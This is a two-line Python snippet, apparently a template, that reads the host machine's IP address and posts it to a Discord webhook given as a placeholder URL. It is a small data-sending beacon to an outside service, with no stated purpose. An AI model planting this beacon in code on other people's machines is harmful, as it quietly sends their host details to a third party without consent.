import socket,requests
requests.post("YOUR_DISCORD_WEBHOOK_URL",json={"content":socket.gethostbyname(socket.gethostname())})